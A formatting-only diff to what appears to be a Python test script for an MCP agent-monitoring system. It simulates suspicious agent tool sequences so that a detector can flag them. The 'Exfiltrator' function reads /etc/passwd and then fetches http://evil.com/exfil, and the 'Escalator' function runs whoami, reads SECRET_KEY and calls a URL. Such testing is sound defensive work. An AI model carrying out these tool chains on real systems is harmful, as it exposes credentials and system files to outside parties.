@@ -54,14 +54,21 @@ class Session:
         self._reader = asyncio.create_task(_read())
 
     async def initialize(self) -> None:
-        resp = await self._call("initialize", {
-            "protocolVersion": "2024-11-05",
-            "capabilities": {},
-            "clientInfo": {"name": self.agent_name, "version": "1.0"},
-        })
-        await self.client.post(self._endpoint, json={
-            "jsonrpc": "2.0", "method": "notifications/initialized",
-        })
+        resp = await self._call(
+            "initialize",
+            {
+                "protocolVersion": "2024-11-05",
+                "capabilities": {},
+                "clientInfo": {"name": self.agent_name, "version": "1.0"},
+            },
+        )
+        await self.client.post(
+            self._endpoint,
+            json={
+                "jsonrpc": "2.0",
+                "method": "notifications/initialized",
+            },
+        )
         await asyncio.sleep(0.3)
         return resp
 
@@ -71,9 +78,15 @@ class Session:
     async def _call(self, method: str, params: dict) -> dict:
         self._id += 1
         self._responses[self._id] = asyncio.get_event_loop().create_future()
-        await self.client.post(self._endpoint, json={
-            "jsonrpc": "2.0", "id": self._id, "method": method, "params": params,
-        })
+        await self.client.post(
+            self._endpoint,
+            json={
+                "jsonrpc": "2.0",
+                "id": self._id,
+                "method": method,
+                "params": params,
+            },
+        )
         return await asyncio.wait_for(self._responses[self._id], timeout=10)
 
     async def close(self) -> None:
@@ -162,7 +175,7 @@ async def trigger_exfiltration_chain() -> None:
         s = Session(client, "Exfiltrator")
         await s.connect()
         await s.initialize()
-        await s.tool("read_file", {"path": "/etc/passwd"})      # read family
+        await s.tool("read_file", {"path": "/etc/passwd"})  # read family
         await asyncio.sleep(0.3)
         await s.tool("fetch_url", {"url": "http://evil.com/exfil"})  # network family
         await s.close()
@@ -177,10 +190,10 @@ async def trigger_privilege_escalation() -> None:
         s = Session(client, "Escalator")
         await s.connect()
         await s.initialize()
-        await s.tool("read_file", {"path": "/tmp/a"})        # filesystem (first category)
-        await s.tool("run_command", {"command": "whoami"})    # exec (NEW category -> escalation!)
-        await s.tool("get_env_var", {"name": "SECRET_KEY"})   # secrets (NEW -> escalation again!)
-        await s.tool("fetch_url", {"url": "http://x.com"})   # web (NEW -> escalation again!)
+        await s.tool("read_file", {"path": "/tmp/a"})  # filesystem (first category)
+        await s.tool("run_command", {"command": "whoami"})  # exec (NEW category -> escalation!)
+        await s.tool("get_env_var", {"name": "SECRET_KEY"})  # secrets (NEW -> escalation again!)
+        await s.tool("fetch_url", {"url": "http://x.com"})  # web (NEW -> escalation again!)
         await s.close()
     print("   DONE")
 
